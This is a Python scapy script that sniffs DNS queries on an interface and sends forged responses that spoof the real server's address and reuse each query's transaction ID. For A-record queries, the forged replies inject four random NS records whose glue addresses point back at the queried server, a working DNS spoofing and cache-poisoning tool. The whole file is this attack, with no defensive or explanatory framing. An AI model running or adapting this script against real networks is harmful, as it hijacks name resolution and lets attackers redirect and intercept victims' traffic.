#!/usr/bin/env python3
# Import scapy libraries
from scapy.all import *
import string
import random

# Set the interface to listen and respond on
net_interface = "eth0"


# Berkeley Packet Filter for sniffing specific DNS packet only
packet_filter = " and ".join([
    "udp dst port 53",          # Filter UDP port 53
    "udp[10] & 0x80 = 0"       # DNS queries only
    ])

# Function that replies to DNS query
def dns_reply(packet):

    # Construct the DNS packet
    # Construct the Ethernet header by looking at the sniffed packet
    eth = Ether(
        src=packet[Ether].dst,
        dst=packet[Ether].src
        )

    # Construct the IP header by looking at the sniffed packet
    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src
        )

    # Construct the UDP header by looking at the sniffed packet
    udp = UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
        )

    random_domain_list = []
    for i in range(0,4):
        letters = string.ascii_lowercase
        random_string = ( ''.join(random.choice(letters) for i in range(10)) )
        random_domain = random_string + '.com.'
        random_domain_list.append('ns01.' + random_domain)
        
    original_domain_tmp = (str(packet[DNS].qd.qname).split('.')[1:-1])
    original_domain = ('.'.join(original_domain_tmp) + '.')
    
    # Construct the DNS response by looking at the sniffed packet and manually
    if packet[DNS].qd.qtype == 1:
        dns = DNS(
            id=packet[DNS].id,
            qd=packet[DNS].qd,
            aa=0,
            rd=0,
            qr=1,
            rcode=0,
            qdcount=1,
            ancount=0,
            nscount=4,
            arcount=4,
            ns=DNSRR(
                rrname=original_domain,
                type='NS',ttl=300,
                rdata=random_domain_list[0])/
               DNSRR(
                rrname=original_domain,
                type='NS',ttl=300,
                rdata=random_domain_list[1])/
               DNSRR(
                rrname=original_domain,
                type='NS',ttl=300,
                rdata=random_domain_list[2])/
               DNSRR(
                rrname=original_domain,
                type='NS',ttl=300,
                rdata=random_domain_list[3]),
            ar=DNSRR(
                rrname=random_domain_list[0],
                type='A',
                ttl=300,
                rdata=packet[IP].dst)/
               DNSRR(
                rrname=random_domain_list[1],
                type='A',
                ttl=300,
                rdata=packet[IP].dst)/
               DNSRR(
                rrname=random_domain_list[2],
                type='A',
                ttl=300,
                rdata=packet[IP].dst)/
               DNSRR(
                rrname=random_domain_list[3],
                type='A',
                ttl=300,
                rdata=packet[IP].dst)
        )
        response_packet = eth / ip / udp / dns
        sendp(response_packet, iface=net_interface)
    else:
        dns = DNS(
            id=packet[DNS].id,
            qd=packet[DNS].qd,
            aa=0,
            rd=0,
            qr=1,
            rcode=0,
            qdcount=1,
            ancount=0,
            nscount=0,
            arcount=0,
            )
        response_packet = eth / ip / udp / dns
        sendp(response_packet, iface=net_interface)
            
# Sniff for a DNS query matching the 'packet_filter' and send a specially crafted reply
sniff(filter='udp and dst port 53', iface=net_interface, store=0, prn=dns_reply)

